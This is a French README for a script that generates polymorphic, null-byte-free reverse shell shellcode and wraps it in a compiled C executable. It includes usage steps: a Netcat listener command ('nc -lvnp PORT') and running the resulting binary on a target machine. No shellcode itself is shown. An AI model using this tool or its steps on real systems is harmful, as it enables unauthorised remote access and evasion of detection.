# 🕵️‍♂️ Shellcode 


# ⚠️ Disclaimer

Ce script génère un shellcode polymorphe pour un reverse shell. Il prend en entrée une adresse IP et un port, encode ces informations pour éviter les octets nuls, et génère un fichier en assembleur qui est ensuite compilé en shellcode. 
Le shellcode est intégré dans un fichier C qui peut être compilé pour fournir un exécutable. L'objectif est de créer un reverse shell qui se connecte à une machine attaquante.

## 👥 Auteurs

- [@mrl91](https://github.com/mrl91)
- [@VD17](https://github.com/VD17)


## 🛠️ Installation

Prérequis :

- **NASM**
    sudo apt-get install nasm binutils gcc


- **argparse**
    pip install argparse


## 📚 Utilisation

Exécution du Script
```python
python script.py --ip IP_ADDRESS --port PORT
```

Ouvrez un Netcat : 
```sh 
nc -lvnp PORT
```

Lancez le reverse shell sur la machine cible : 
```sh
./reverse_shell.out
```

## 👀 Résultats
Après l'exécution du script, vous verrez des informations détaillées sur le shellcode généré, y compris les adresses IP et ports encodés et décodés, ainsi que les opcodes du shellcode.

## ✨ Fonctionnalités

- Encode une adresse IP et un port en évitant les octets nuls.
    Le script encode l'adresse IP et le port pour éviter les octets nuls, convertissant les valeurs en format little-endian.

- Génère un shellcode polymorphe avec des instructions aléatoires.
    Le shellcode est généré en utilisant des instructions polymorphes et des NOPs aléatoires.

- Compile le code assembleur en shellcode.
    Le code assembleur est compilé en un fichier objet, puis lié pour créer un exécutable binaire. Les opcodes sont extraits de l'exécutable binaire.

- Crée un fichier C contenant le shellcode pour produire un exécutable.
    Un fichier C est créé avec le shellcode intégré. Ce fichier est ensuite compilé pour produire un exécutable prêt à l'emploi.

- Affiche des informations détaillées sur le shellcode généré.
    Le script affiche des informations sur l'encodage et le décodage de l'adresse IP et du port, ainsi que les opcodes du shellcode.

## Comming soon

Nous avons commencé l'intégration de la compatibilité de ce code sous Windows afin de pouvoir générer des shell codes foncionnel sous environnement microsoft.
De plus, nous avons travaillé sur le chiffrement des flux mais nous rencontrons des problèmes.